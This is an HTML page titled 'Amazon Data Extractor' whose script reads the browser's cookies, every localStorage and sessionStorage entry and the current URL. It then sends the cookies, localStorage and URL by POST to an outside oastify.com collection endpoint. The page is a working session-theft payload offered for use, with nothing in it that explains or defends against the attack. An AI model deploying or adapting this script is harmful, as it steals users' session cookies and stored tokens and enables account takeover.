<!DOCTYPE html>
<html>
<head>
    <title>Amazon Data Extractor</title>
</head>
<body>
    <h1>Data Extraction</h1>
    <div id="output"></div>
    <script>
        function log(msg) {
            document.getElementById('output').innerHTML += msg + '<br>';
            console.log(msg);
        }
        
        // Extract all cookies
        log('Cookies: ' + document.cookie);
        
        // Check localStorage
        log('LocalStorage items: ' + localStorage.length);
        for(let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            log('  ' + key + ': ' + localStorage.getItem(key));
        }
        
        // Check sessionStorage
        log('SessionStorage items: ' + sessionStorage.length);
        for(let i = 0; i < sessionStorage.length; i++) {
            let key = sessionStorage.key(i);
            log('  ' + key + ': ' + sessionStorage.getItem(key));
        }
        
        // Get current page info
        log('Current URL: ' + window.location.href);
        log('Document title: ' + document.title);
        log('Meta tags: ' + document.querySelectorAll('meta').length);
        
        // Send data to your server (if you want)

        fetch('https://h7pxdietsy9w62he8s5czv22nttkhg55.oastify.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                cookies: document.cookie,
                localStorage: localStorage,
                url: window.location.href
            }),
            headers: {'Content-Type': 'application/json'}
        });

    </script>
</body>
</html>
